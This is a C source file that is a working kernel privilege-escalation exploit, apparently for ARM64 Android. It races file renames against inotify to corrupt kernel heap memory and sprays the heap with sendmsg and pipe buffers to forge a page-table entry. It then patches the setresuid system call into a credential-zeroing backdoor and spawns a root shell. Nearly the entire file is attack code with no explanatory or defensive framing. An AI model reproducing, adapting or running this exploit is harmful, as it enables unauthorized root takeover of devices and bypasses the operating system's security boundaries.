#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <sys/eventfd.h>
#include <sys/inotify.h>
#include <sys/mman.h>
#include <ctype.h>
#include <errno.h>
#include <err.h>
#include <poll.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <netinet/ip.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <sys/msg.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#define THREAD_COUNT 200
pthread_t rthread[THREAD_COUNT] = {0};
int pipe_writes[THREAD_COUNT] = {0};
#define MMAP_ADDR ((void*)0x44454000)
#define MMAP_ADDR_WRITE ((void*)0x44454647)
#define MMAP_SIZE (PAGE_SIZE * 2)
static char wbuf[8] = {"FFFF8888"};
#define IOVECS (10)
static struct iovec iovs[IOVECS];

static unsigned long get_fack_block(unsigned long phys_addr)
{
	unsigned long fake_d_block = 0l;
	// d_block 中的内容，主要是修改 AP[2:1], 修改为读写属性
    	// bit[1:0]
    	fake_d_block = fake_d_block | (0x0000000000000001);     //                  Y
    	// bit[11:2] lower block attributes
    	fake_d_block = fake_d_block | (0x0000000000000800);     // nG, bit[11]      Y
    	fake_d_block = fake_d_block | (0x0000000000000400);     // AF, bit[10]      Y
    	fake_d_block = fake_d_block | (0x0000000000000200);     // SH, bits[9:8]
    	fake_d_block = fake_d_block | (0x0000000000000040);     // AP[2:1], bits[7:6]
    	fake_d_block = fake_d_block | (0x0000000000000020);     // NS, bit[5]       Y
   	fake_d_block = fake_d_block | (0x0000000000000010);     // AttrIndx[2:0], bits[4:2]
    	// bit[29:12] RES0
    	// bit[47:30] output address
    	fake_d_block = fake_d_block | (phys_addr & 0x0000ffffc0000000);
    	// bit[51:48] RES0
    	// bit[63:52] upper block attributes, [63:55] ignored
    	fake_d_block = fake_d_block | (0x0010000000000000);     // Contiguous, bit[52]
    	fake_d_block = fake_d_block | (0x0020000000000000);     // PXN, bit[53]
    	fake_d_block = fake_d_block | (0x0040000000000000);     // XN, bit[54]
	return fake_d_block;
}

static patch_syscall(unsigned long mirror_kaddr)
{
	unsigned int *p = (unsigned int *)mirror_kaddr;
	*p = 0xd2822224; p++; //MOV X4, #0x1111
	*p = 0xEB04001F; p++; //CMP X0, X4
	*p = 0x54000261; p++; //BNE _ret
	*p = 0xD2844444; p++; //MOV X4, #0x2222
	*p = 0xEB04003F; p++; //CMP X1, X4
	*p = 0x54000201; p++; //BNE _ret
	*p = 0xD2866664; p++; //MOV X4, #0x3333
        *p = 0xEB04005F; p++; //CMP X2, X4
        *p = 0x540001a1; p++; //BNE _ret
	*p = 0x910003E0; p++; //MOV X0, SP
	*p = 0x9272C401; p++; //AND X1, X0, #0xffffffffffffc000
	*p = 0xF9400822; p++; //LDR X2, [X1, #0x10]
	*p = 0xF942EC43; p++; //LDR X3, [X2, #0x5D8]
	*p = 0x2900FC7F; p++; //STP WZR, WZR, [X3, #4]
	*p = 0x2901FC7F; p++; //STP WZR, WZR, [X3, #0xC]
	*p = 0x2902FC7F; p++; //STP WZR, WZR, [X3, #0x14]
	*p = 0x2903FC7F; p++; //STP WZR, WZR, [X3, #0x1C]
	*p = 0x92800001; p++; //MOV X1, #0xFFFFFFFFFFFFFFFF
	*p = 0xA9028461; p++; //STP X1, X1, [X3, #0x28]	
	*p = 0xA9038461; p++; //STP X1, X1, [X3, #0x38]
	*p = 0xF9002461; p++; //STR X1, [X3, #0x48]
	*p = 0xD65F03C0; p++; //RET
}

static void* readpipe(void* param)
{
	readv(*(int *)param, iovs, 10);
}

static void createthread(int * pipe_write, int thread_index)
{
	int * pipefd;
	pipefd = malloc(2 * sizeof(int));
	pipe(pipefd);
	*pipe_write = pipefd[1];
	int ret;
	if((ret = pthread_create(&rthread[thread_index], NULL, readpipe, &pipefd[0])))
                perror("read pthread_create()");

}

static void createpipes()
{
	for (int i = 0; i < THREAD_COUNT; i++)
	{
		createthread(&pipe_writes[i], i);
	}
}

static void releaehalfpipes()
{
	for (int i = 0; i < THREAD_COUNT; i++)
	{
		int fd = pipe_writes[i];
		if (fd > 0 && i%2 == 0)
		{
			if(write(fd, wbuf, sizeof(wbuf)) != sizeof(wbuf))
                		perror("write()");	
		}
	}
}

static void writehalfpipes()
{
	unsigned long fake_d_block = get_fack_block(0x40000000);
        for (int i = 0; i < THREAD_COUNT; i++)
        {
                int fd = pipe_writes[i];
                if (fd > 0 && i%2 == 1)
                {
                        if(write(fd, &fake_d_block, sizeof(unsigned long)) != sizeof(wbuf))
                                perror("write()");
                }
        }
}

static int initmappings()
{
	memset(iovs, 0, sizeof(iovs));

	if(mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == (void*)-1)
	{
		perror("mmap()");
		return -1;
	}


	iovs[0].iov_base = MMAP_ADDR;
	//we need more than one pipe buf so make a total of 2 pipe bufs (8192 bytes)
	iovs[0].iov_len = 8;

	return 0;
}

static void waithalfrelease()
{
	for (int i = 0; i < THREAD_COUNT; i++)
	{
		if (i%2 == 0)
		{
			pthread_join(rthread[i], NULL);
		}
	}
}

static void waitallrelease()
{
        for (int i = 0; i < THREAD_COUNT; i++)
        {
                if (i%2 == 1)
                {
                        pthread_join(rthread[i], NULL);
                }
        }
}

void *callrename( void *ptr );
void *openclose( void *ptr );
pthread_t thread1, thread2;
int lastfd;
char *space;
int original,printed, *int_space;

volatile int stop = 0;

// Try kmalloc-192 made by cyclic(100)
char *orig_name = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
//char *longname_padding =   "qhhhhhkhkhkhfdfsdfsdfsdfsdf";
char *longname_padding = "qfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
// 120
//char *orig_name = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
#define BUFF_SIZE 172
static void fillhole()
{
        char buff[BUFF_SIZE];
        struct msghdr msg = {0};
        struct sockaddr_in addr = {0};
	memset(buff, 0x43, sizeof buff);
	unsigned long * iovec_addr = (unsigned long *)&buff[164];
	*iovec_addr = 0xffffffc000872840;

        int sockfd = socket(AF_INET, SOCK_DGRAM, 0);


        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr.sin_family = AF_INET;
        addr.sin_port = htons(6666);

        /* This is the data that will overwrite the vulnerable object in the heap */
        msg.msg_control = buff;

        /* This is the user controlled size, eventually kmalloc(msg_controllen) will occur */
        msg.msg_controllen = BUFF_SIZE; // should be chdr->cmsg_len but i want to force the size

        msg.msg_name = (caddr_t)&addr;
        msg.msg_namelen = sizeof(addr);

        /* Heap spray */
        sendmsg(sockfd, &msg, 0);
}

static void handle_events(int fd, int *wd, int argc, char* argv[])
{
   /* Some systems cannot read integer variables if they are not
      properly aligned. On other systems, incorrect alignment may
      decrease performance. Hence, the buffer used for reading from
      the inotify file descriptor should have the same alignment as
      struct inotify_event. */

   char buf[4096]
       __attribute__ ((aligned(__alignof__(struct inotify_event))));
   const struct inotify_event *event;
   int i;
   ssize_t len;
   char *ptr;

   /* Loop while events can be read from inotify file descriptor. */

   for (;!stop;) {

       /* Read some events. */

       len = read(fd, buf, sizeof buf);
       if (len == -1 && errno != EAGAIN) {
           perror("read");
           exit(EXIT_FAILURE);
       }

       /* If the nonblocking read() found no events to read, then
          it returns -1 with errno set to EAGAIN. In that case,
          we exit the loop. */

       if (len <= 0)
           break;

       /* Loop over all events in the buffer */

       for (ptr = buf; ptr < buf + len;
               ptr += sizeof(struct inotify_event) + event->len) {

           event = (const struct inotify_event *) ptr;

           /* Print event type */
/*
           if (event->mask & IN_OPEN)
               printf("IN_OPEN: ");
           if (event->mask & IN_CLOSE_NOWRITE)
               printf("IN_CLOSE_NOWRITE: ");
           if (event->mask & IN_CLOSE_WRITE)
               printf("IN_CLOSE_WRITE: ");
           if (event->mask % IN_ACCESS)
               printf("IN_ACCESS: ");
*/
           /* Print the name of the watched directory */

           for (i = 1; i < argc; ++i) {
               if (wd[i] == event->wd) {
                   //printf("%s/", argv[i]);
                   break;
               }
           }
           /* Print the name of the file */
           if (event->len && strstr(event->name, "CCCCCCCCCCCC")) {
               printf("%s() event->name : %s, event->len : %d\n",__func__, event->name, event->len);

               printf("Detected overwrite!!!\n");
               stop = 1;
               break;
           }

           /* Print type of filesystem object */
/*
           if (event->mask & IN_ISDIR)
               printf(" [directory]\n");
           else
               printf(" [file]\n");
*/
       }
   }
}

static void* notify_thread_func(void* arg) 
{
   char buf;
   int fd, i, poll_num;
   int *wd;
   nfds_t nfds;
   struct pollfd fds[2];

   int argc = 2;
   char *argv[] = { NULL, "test_dir", NULL};
/*
   if (argc < 2) {
       printf("Usage: %s PATH [PATH ...]\n", argv[0]);
       exit(EXIT_FAILURE);
   }
*/
   //printf("Press ENTER key to terminate.\n");

   /* Create the file descriptor for accessing the inotify API */

   fd = inotify_init1(IN_NONBLOCK);
   if (fd == -1) {
       perror("inotify_init1");
       exit(EXIT_FAILURE);
   }

   /* Allocate memory for watch descriptors */

   wd = calloc(argc, sizeof(int));
   if (wd == NULL) {
       perror("calloc");
       exit(EXIT_FAILURE);
   }

   /* Mark directories for events
      - file was opened
      - file was closed */

   for (i = 1; i < argc; i++) {
       wd[i] = inotify_add_watch(fd, argv[i],
                                 IN_OPEN | IN_CLOSE| IN_ACCESS);
       if (wd[i] == -1) {
           fprintf(stderr, "Cannot watch '%s'\n", argv[i]);
           perror("inotify_add_watch");
           exit(EXIT_FAILURE);
       }
   }

   /* Prepare for polling */

   nfds = 2;

   /* Console input */

   fds[0].fd = STDIN_FILENO;
   fds[0].events = POLLIN;

   /* Inotify input */

   fds[1].fd = fd;
   fds[1].events = POLLIN;

   printf("Listening for events.\n");
   while (!stop) {
       poll_num = poll(fds, nfds, -1);
       if (poll_num == -1) {
           if (errno == EINTR)
               continue;
           perror("poll");
           exit(EXIT_FAILURE);
       }

       if (poll_num > 0) {

           if (fds[1].revents & POLLIN) {

               handle_events(fd, wd, argc, argv);
           }
       }
   }

   close(fd);
   printf("thread notify done\n");
   free(wd);
   //exit(EXIT_SUCCESS);
}

void *trigger_rename_open(void* arg)
{
     int  iret1, iret2,i;

     setvbuf(stdout,0,2,0);

     iret1 = pthread_create( &thread1, NULL, callrename, NULL);
     if(iret1)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret1);
         exit(EXIT_FAILURE);
     }
     
     iret2 = pthread_create( &thread2, NULL, openclose, NULL);
     if(iret2)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret2);
         exit(EXIT_FAILURE);
     }
     pthread_join( thread1, NULL);
     printf("thread1 callrename done\n");
     pthread_join( thread2, NULL);
     printf("thread2 openclose done\n");
     //exit(EXIT_SUCCESS);
}


// 250
//char *longname_padding =   "fhhhhhhkhkhkhfdfsdfsdfsdfsdf";
//char *longname_padding =   "bbbb32103210321032103210ABCDEF";
/*
rcx : 44434241..
      DCDA0123
*/
//  char *longname_padding =   "bbbb3210321032GFEDCBA";
// 31 will crash
void *callrename( void *ptr )
{
    int i,m,k;
    char enter = 0;
    char origname[1024];
    char longname[1024];
    char next_ptr[8] = "\x30\xff\xff\x31\xff\xff\xff\xff"; 
    char prev_ptr[8] = ""; 
    // This value will overwrite the next (struct fsnotify_event)event->list.next 


    // create shortname being initial name.
    snprintf(origname, sizeof origname, "test_dir/%s", orig_name);
    //printf("origname=\"%s\"\n", origname);
    
    snprintf(longname, sizeof longname, "test_dir/%s", 
             longname_padding);
    //strcat(longname,space);
    printf("longname=\"%s\"\n", longname);

    for (i=0;i<1000 && !stop ;i++)
    {
        if (rename(origname,longname)<0) perror("rename1");
	for (int j = 0; j < 1; j++)
	{
		fillhole();
	}
        if (rename(longname,origname)<0) perror("rename2");
        
    }

    printf("callrename done.\n");
    stop = 1;
}

void *openclose( void *ptr )
{
    int j,fd,m,k;
    char origname[1024];
    snprintf(origname, sizeof origname, "test_dir/%s", orig_name);

    for (j=0;j<10000 && !stop;j++ )
    {
        //if (open(origname,O_RDWR) < 0) perror("open");
	open(origname,O_RDWR);
    }
    printf("openclose done.\n");
    stop = 1;

}

void test_addr_directly() {
    unsigned long addr = 0xffffffc200000000 + 0x872800;
    printf("0x%lx  --> 0x%lx\n", addr, *(unsigned long *) addr);
}

int main(void) 
{
	initmappings();
    	createpipes();
   	sleep(2);
   	releaehalfpipes();
    	waithalfrelease();

    	pthread_t notify_thread[4];
    	pthread_t rename_thread;
    	int i = 1;
    
    	char buf[1024];
    	snprintf(buf, sizeof buf, "touch test_dir/%s", orig_name);
   	system("rm -rf /data/local/tmp/test_dir ; mkdir test_dir");
    	system(buf);

    	for ( i ; i < 2; i++ ) {
        	pthread_create(&notify_thread[i], 
                       NULL, 
                       notify_thread_func, 
                       NULL);
    	}
    	//Trigger inotify event by file open and rename to 
    	//trigger the vulnerability 
    	pthread_create(&rename_thread, NULL, trigger_rename_open, NULL);

    	pthread_join(rename_thread, NULL);
    	printf("rename_thread end\n");
    	for ( i = 1; i < 2; i++ )
        	pthread_join(notify_thread[i], NULL);
   	printf("notify_thread end\n");
    	writehalfpipes();
    	waitallrelease();
	test_addr_directly();	
	
	unsigned long setresuidaddr = 0xffffffc0000ad968 - 0xffffffc000000000 + 0xffffffc200000000;
	patch_syscall(setresuidaddr);
	printf("get root from rooting backdor\n");
	setresuid(0x1111, 0x2222, 0x3333);
	if (getuid() == 0)
	{
		printf("spawn a root shell\n");
		execl("/system/bin/sh", "/system/bin/sh", NULL);
	}
	
    	return 1;
}
